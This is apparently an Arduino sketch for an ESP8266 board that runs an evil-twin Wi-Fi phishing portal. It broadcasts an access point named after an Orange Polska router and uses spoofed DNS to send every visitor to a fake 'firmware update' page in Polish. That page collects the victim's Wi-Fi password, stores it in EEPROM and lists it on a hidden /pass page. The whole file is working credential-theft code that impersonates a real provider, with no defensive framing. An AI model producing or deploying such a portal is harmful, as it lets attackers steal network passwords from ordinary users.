// ESP8266 WiFi Captive Portal
// By 125K (github.com/125K)

// Libraries
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default SSID name
const char *SSID_NAME = "Orange_Swiatlowod_XXXX";

// Default main strings
#define SUBTITLE "Informacja."
#define TITLE "Aktualizacja"
#define BODY "Oprogramowanie routera jest nieaktualne. Zaktualizuj oprogramowanie, aby kontynuować normalne przeglądanie."
#define POST_TITLE "Aktualizacja ..."
#define POST_BODY "Twój router jest aktualizowany. Proszę zaczekać, aż proces się zakończy...</br>"
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

// Init system settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String allPass = "";
String newSSID = "";
String currentSSID = "";

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName)
{
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer()
{
  return "<footer class=q><h2><a>Orange &#169; All rights reserved.</a></h2></div>";
}

String header(String t)
{
  String a = String(currentSSID);
  String CSSLOG = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body {background-color: #e6e6e6;width: 100%;min-height: 680px;font-family: Helvetica, Arial, sans-serif;}"
    ".form-container {line-height: 1.4;}"
    "header, footer, .form-container {position:relative;top:0; z-index: 10;display:block;background-color: #FFF; padding: 20px 50px 20px 50px}"
    "#logo {color: #000000;}"
    "header, footer {background: #000000;}"
    "h2 {color: #ff6600;font-weight: normal;line-height: 20px;padding-top: 10px;font-weight: normal;line-height: 20px; padding-top: 10px;}"
    "input[type=button], input[type=submit], input[type=reset] {background-color: #ff6600;border: none;color: white;padding: 16px 32px;text-decoration: none;margin: 4px 2px;cursor: pointer;}"
    "input[type=text], input[type=password] {border: 1px solid #000;border-radius: 4px;padding: 10px;text-decoration: none;margin: 4px 2px;}"
    ".success {margin:10px;width: 100%;text-align: left;font-weight: bold;}";
  String h = "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">"
             "<head class=\"no-js\" xmlns =\"http://www.w3.org/1999/xhtml\" dir=\"ltr\" lang=\"en\">"
            "<title>Funbox " + a + "::" + t + "</title>"
            "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />"
            "<style>" + CSSLOG + "</style>"
                    "<meta charset=\"UTF-8\"></head>"
                    "<body class=\"log\"><h1 id=\"logo\"><input style=\"padding: 30px 2px 0px 2px;\" type=\"submit\" value=\"orange\"> FunBox 3.0</h1><header><h2>" + BODY + "</h2><</header>";
  return h;
}

String index(){
    return header(TITLE) + "<div class=\"form-container\">"
    "<form action=/post method=post>"
    "Hasło: <input type=\"password\" name=\"pass\"></input>"
    "<input type=\"submit\" value=\"Aktualizuj\"></form>" 
    "<div class=\"separator\"><hr/></div>"
    "<div class=\"help-container\">"
      "<p class=\"help-container-pl\">Domyślne hasło do menu znajdziesz na naklejce na spodzie modemu - to pierwszych osiem (8) znaków klucza Wi-Fi.</p>"
      "<p class=\"help-container-pl\">Domyślne hasło możesz zmienić - w tym celu po zalogowaniu kliknij zakładkę „opcje”, \"ustawienia zaawansowane\" i w lewym menu wybierz \"zarządzanie\".</p>"
      "<br>"
      "<p class=\"help-container-pl\"><b>Domyślna nazwa sieci Wi-Fi:</b></p>"
      "<p class=\"help-container-pl\">" + currentSSID + "</p>"
    "</div>"
    "</div>"
    + footer();
}

String posted()
{
  String pass = input("pass");
  pass = "<li><b>" + pass + "</li></b>"; // Adding password in a ordered list.
  allPass += pass;                       // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
  }

  passEnd += pass.length(); // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + "<div class=\"success\">" + POST_BODY + "</div>" + footer();
}

String pass()
{
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String ssid()
{
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>" +
         "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID()
{
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i)
  {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  currentSSID = postedSSID;
  return header("SSID posted") + "<p>" + postedSSID + "</p>" + footer();
}

String clear()
{
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK()
{ // The built-in LED will blink 5 times after a password is posted.
  for (int counter = 0; counter < 10; counter++)
  {
    // For blinking the LED.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup()
{
  // Serial begin
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read EEPROM SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0')
  {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);

  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
  webServer.on("/post", []()
               { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid", []()
               { webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID", []()
               { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass", []()
               { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear", []()
               { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]()
                       { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

  // Enable the built-in LED
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop()
{
  if ((millis() - lastTick) > TICK_TIMER)
  {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}